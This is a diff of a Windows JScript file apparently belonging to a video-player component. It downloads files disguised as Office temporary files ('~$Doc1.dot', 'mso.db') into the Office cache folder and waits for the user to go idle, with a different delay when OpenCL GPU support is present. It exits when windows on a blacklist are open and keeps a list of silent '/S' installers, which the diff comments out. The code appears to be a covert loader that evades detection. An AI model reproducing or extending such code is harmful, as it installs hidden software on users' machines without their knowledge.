@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"8981A23C772567B51DE210A60B424F91" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"A888F01DD4EDEABEB888B520B3001892" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -36,13 +36,13 @@ if(__DEBUG)
 else if(__IsSupportOpencl)
 	var __idletime=1000*30
 var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"305373AE97A5DD2CBB123F45BA664AAA" }
-var __installReadys = [
+var __installReadys = [/*
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
 							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
 							condition:{type: "reg", subtype: "existreg", value:"HKEY_LOCAL_MACHINE\\SOFTWARE\\Thunder Network\\Xmp\\installtimes"} 
 						},
 						{id: 10002, name: "XMPSetup-fanli(2).exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"},
-					  ]			
+					  */]			
 //
 trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified + 
 		" ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+
@@ -395,7 +395,9 @@ function filter_eXclusiveRuning.prototype.checkWindows(){
 	var titile
 	var ret = __windows.EnumWindows(function(hwnd, text){
 		for(var index in blacklist){
-			if(text.indexOf(blacklist[index])>=0){
+			var t = text.toLowerCase();
+			var s = blacklist[index].toLowerCase();
+			if(t.indexOf(s)>=0){
 				titile = text;
 				log("exist wnd " + text + " will exit() ;")
 				return 0;
